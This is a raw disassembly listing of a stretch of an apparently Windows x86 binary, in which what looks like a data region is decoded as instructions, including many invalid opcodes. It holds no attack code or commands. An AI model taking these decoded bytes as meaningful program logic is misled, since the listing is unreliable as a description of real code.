  40703d:	15 6b 01 f9 02       	adc    $0x2f9016b,%eax
  407042:	10 0b                	adc    %cl,(%ebx)
  407044:	23 02                	and    (%edx),%eax
  407046:	01 03                	add    %eax,(%ebx)
  407048:	09 15 0e 00 01 03    	or     %edx,0x301000e
  40704e:	51                   	push   %ecx
  40704f:	07                   	pop    %es
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 9d 14 47 02 c1    	add    %ebx,-0x3efdb8ec(%ebp)
  407059:	01 c7                	add    %eax,%edi
  40705b:	17                   	pop    %ss
  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 09                	add    (%ecx),%ecx
  407061:	15 6b 01 09 03       	adc    $0x309016b,%eax
  407066:	62 19                	bound  %ebx,(%ecx)
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	f1                   	int1
  40706d:	14 70                	adc    $0x70,%al
  40706f:	05 19 03 f2 1a       	add    $0x1af20319,%eax
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	d9 0f                	(bad) (%edi)
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 0e             	roll   $0xe,(%ecx)
  40707f:	1a 47 02             	sbb    0x2(%edi),%al
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	de 1b                	ficomps (%ebx)
  407086:	bf 01 81 02 d2       	mov    $0xd2028101,%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	53                   	push   %ebx
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 7f 07             	add    %edi,0x7(%edi)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	41                   	inc    %ecx
  4070a3:	07                   	pop    %es
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	08 11                	or     %dl,(%ecx)
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 c5 18       	add    $0x18c501c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 09 15       	add    $0x15090349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	52                   	push   %edx
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	21 0d 75 01 69 00    	and    %ecx,0x690175
  4070c6:	09 15 0e 00 21 02    	or     %edx,0x221000e
  4070cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4070cd:	0c 70                	or     $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	d3 04 aa             	roll   %cl,(%edx,%ebp,4)
  4070d5:	05 c1 01 d2 0c       	add    $0xcd201c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 4b             	roll   $0x4b,(%ecx)
  4070df:	14 47                	adc    $0x47,%al
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 ec                	add    %ebp,%esp
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 e2 0f       	add    $0xfe20159,%eax
  4070ec:	1d 00 61 03 6e       	sbb    $0x6e036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	50                   	push   %eax
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	ba 07 c3 05 59       	mov    $0x5905c307,%edx
  407101:	03 cc                	add    %esp,%ecx
  407103:	07                   	pop    %es
  407104:	c3                   	ret
  407105:	05 59 03 6e 0c       	add    $0xc6e0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	fe                   	(bad)
  40710f:	1a c9                	sbb    %cl,%cl
  407111:	05 79 03 09 15       	add    $0x15090379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 7b 06       	add    $0x67b0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 68 08       	add    $0x86800c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 68 08             	add    %ch,0x8(%eax)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 09                	add    (%ecx),%ecx
  40712d:	15 36 02 0c 00       	adc    $0xc0236,%eax
  407132:	09 15 0e 00 0c 00    	or     %edx,0xc000e
  407138:	2c 03                	sub    $0x3,%al
  40713a:	f5                   	cmc
  40713b:	05 0c 00 49 1b       	add    $0x1b49000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	7a 1c                	jp     0x407162
  407146:	fb                   	sti
  407147:	05 c1 01 e7 10       	add    $0x10e701c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 f6                	add    %dh,%dh
  407151:	17                   	pop    %ss
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 f4                	add    %dh,%ah
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 75 03             	add    %dh,0x3(%ebp)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	73 1d                	jae    0x407181
  407164:	1d 06 69 00 09       	sbb    $0x9006906,%eax
  407169:	15 01 03 61 00       	adc    $0x610301,%eax
  40716e:	09 15 2d 06 91 03    	or     %edx,0x391062d
  407174:	68 08 0e 00 99       	push   $0x99000e08
  407179:	03 09                	add    (%ecx),%ecx
  40717b:	15 56 04 a1 03       	adc    $0x3a10456,%eax
  407180:	bd 0b 35 06 81       	mov    $0x8106350b,%ebp
  407185:	02 21                	add    (%ecx),%ah
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	a9 1c 35 05 91       	test   $0x9105351c,%eax
  407191:	02 c2                	add    %dl,%al
  407193:	0a 43 06             	or     0x6(%ebx),%al
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	83 05 47 02 91 02 a9 	addl   $0xffffffa9,0x2910247
  40719f:	1c 54                	sbb    $0x54,%al
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 b9 0a 7c 05 91    	add    -0x6efa83f6(%ecx),%bh
  4071a9:	02 a2 0a 6b 01 91    	add    -0x6efe94f6(%edx),%ah
  4071af:	02 c3                	add    %bl,%al
  4071b1:	1c 5e                	sbb    $0x5e,%al
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 72 05             	add    0x5(%edx),%dh
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 2c 03             	add    %ch,(%ebx,%eax,1)
  4071be:	f5                   	cmc
  4071bf:	05 b9 03 b2 1b       	add    $0x1bb203b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	f1                   	int1
  4071c9:	14 92                	adc    $0x92,%al
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	f2 1a a4 06 1c 00 ed 	repnz sbb 0xaed001c(%esi,%eax,1),%ah
  4071d5:	0a 
  4071d6:	a9 06 24 00 de       	test   $0xde002406,%eax
  4071db:	1b bf 01 c9 03 c4    	sbb    -0x3bfc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 22    	adc    %dh,0x2203c906(%ebx)
  4071e7:	03 b9 06 d1 03 2f    	add    0x2f03d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	f4                   	hlt
  4071f3:	04 c8                	add    $0xc8,%al
  4071f5:	06                   	push   %es
  4071f6:	d9 03                	flds   (%ebx)
  4071f8:	12 06                	adc    (%esi),%al
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 bd 08 d8 06 01    	add    0x106d808(%ebp),%edi
  407203:	04 d9                	add    $0xd9,%al
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	bd 08 17 07 2c       	mov    $0x2c071708,%ebp
  40720f:	00 75 19             	add    %dh,0x19(%ebp)
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	9f                   	lahf
  407217:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  40721c:	09 15 0e 00 c1 01    	or     %edx,0x1c1000e
  407222:	b1 1d                	mov    $0x1d,%cl
  407224:	84 00                	test   %al,(%eax)
  407226:	21 04 09             	and    %eax,(%ecx,%ecx,1)
  407229:	15 6b 01 19 04       	adc    $0x419016b,%eax
  40722e:	09 15 59 07 29 04    	or     %edx,0x4290759
  407234:	bd 16 61 07 51       	mov    $0x51076116,%ebp
  407239:	01 39                	add    %edi,(%ecx)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	09 15 6b 01 59 02    	or     %edx,0x259016b
  407246:	09 15 0e 00 31 04    	or     %edx,0x431000e
  40724c:	09 15 0e 00 51 04    	or     %edx,0x451000e
  407252:	65 0b 01             	or     %gs:(%ecx),%eax
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	02 0b                	add    (%ebx),%cl
  40725a:	01 03                	add    %eax,(%ebx)
  40725c:	51                   	push   %ecx
  40725d:	04 03                	add    $0x3,%al
  40725f:	05 7a 07 51 04       	add    $0x451077a,%eax
  407264:	b1 0b                	mov    $0xb,%cl
  407266:	81 07 51 04 a1 1c    	addl   $0x1ca10451,(%edi)
  40726c:	2b 02                	sub    (%edx),%eax
  40726e:	51                   	push   %ecx
  40726f:	04 96                	add    $0x96,%al
  407271:	02 0e                	add    (%esi),%cl
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	2e 15 88 07 39 04    	cs adc $0x4390788,%eax
  40727c:	09 15 8e 07 51 04    	or     %edx,0x451078e
  407282:	88 02                	mov    %al,(%edx)
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 54             	cmp    %eax,(%esp,%edx,2)
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	09 15 2b 02 59 02    	or     %edx,0x259022b
  407294:	7a 1c                	jp     0x4072b2
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 21                	add    (%ecx),%esp
  40729b:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a0:	09 15 6b 01 51 04    	or     %edx,0x451016b
  4072a6:	8f 02                	pop    (%edx)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 1e                	add    $0x1e,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	85 0d 23 02 81 04    	test   %ecx,0x4810223
  4072b8:	34 1d                	xor    $0x1d,%al
  4072ba:	be 07 91 04 5d       	mov    $0x5d049107,%esi
  4072bf:	1c d0                	sbb    $0xd0,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 09 15 0e       	mov    0xe150904,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 d1                	add    %edx,%ecx
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 bd 16 99 01 49    	add    0x49019916(%ebp),%bh
  4072d5:	02 bd 16 ab 01 a9    	add    -0x56fe54ea(%ebp),%bh
  4072db:	00 09                	add    %cl,(%ecx)
  4072dd:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072e2:	d9 0f                	(bad) (%edi)
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	49                   	dec    %ecx
  4072e9:	1b f4                	sbb    %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	ce                   	into
  4072ef:	12 0e                	adc    (%esi),%cl
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 7a 17             	add    %edi,0x17(%edx)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 98 0a 28 08 49    	add    %bl,0x4908280a(%eax)
  4072ff:	02 bd 16 a5 01 51    	add    0x5101a516(%ebp),%bh
  407305:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  40730b:	01 43 10             	add    %eax,0x10(%ebx)
  40730e:	47                   	inc    %edi
  40730f:	02 a9 04 76 08 37    	add    0x37087604(%ecx),%ch
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  407323:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407329:	01 ce                	add    %ecx,%esi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 76 08             	add    0x8(%esi),%esi
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 ce                	add    %ecx,%esi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 be 05 68 08 b1    	add    %edi,-0x4ef797fb(%esi)
  40734d:	04 76                	add    $0x76,%al
  40734f:	08 6d 08             	or     %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 bd 16 7a 08 59    	add    0x59087a16(%ebp),%bh
  407359:	03 4a 1d             	add    0x1d(%edx),%ecx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	09 15 88 08 c1 00    	or     %edx,0xc10888
  407366:	8f 0a f4 01          	(bad)
  40736a:	89 01                	mov    %eax,(%ecx)
  40736c:	09 15 6b 01 49 02    	or     %edx,0x249016b
  407372:	e0 00                	loopne 0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 3b                	add    (%ebx),%bh
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 be       	mov    $0xbe024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	65 00 cb             	gs add %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	e9 00 d9 08 49       	jmp    0x49494c95
  407395:	02 ce                	add    %dh,%cl
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	bd 16 12 09 d1       	mov    $0xd1091216,%ebp
  4073a1:	04 09                	add    $0x9,%al
  4073a3:	15 28 09 09 00       	adc    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 68 1a             	add    %ch,0x1a(%eax)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 4c 1a a4          	add    %cl,-0x5c(%edx,%ebx,1)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 a5 13 a9 00 00    	add    %ah,0xa913(%ebp)
  4075cd:	00 31                	add    %dh,(%ecx)
  4075cf:	0b ae 00 00 00 e2    	or     -0x1e000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 e3    	sbb    %ebp,-0x1d000000(%esi)
  4075db:	0a b2 00 00 00 60    	or     0x60000000(%edx),%dh
  4075e1:	03 b7 00 00 00 00    	add    0x0(%edi),%esi
  4075e7:	03 bb 00 00 00 9b    	add    -0x65000000(%ebx),%edi
  4075ed:	0b b2 00 00 00 05    	or     0x5000000(%edx),%esi
  4075f3:	0f bf 00             	movswl (%eax),%eax
  4075f6:	00 00                	add    %al,(%eax)
  4075f8:	00 0d b7 00 00 00    	add    %cl,0xb7
  4075fe:	ac                   	lods   %ds:(%esi),%al
  4075ff:	1a c3                	sbb    %bl,%al
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 dd                	add    %bl,%ch
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	a0 0d fe 01 00       	mov    0x1fe0d,%al
  40760f:	00 ae 0c 69 02 00    	add    %ch,0x2690c(%esi)
  407615:	00 e5                	add    %ah,%ch
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	10 19                	adc    %bl,(%ecx)
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	91                   	xchg   %eax,%ecx
  407623:	1c 75                	sbb    $0x75,%al
  407625:	02 00                	add    (%eax),%al
  407627:	00 02                	add    %al,(%edx)
  407629:	08 7a 02             	or     %bh,0x2(%edx)
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 2a                	add    %ch,(%edx)
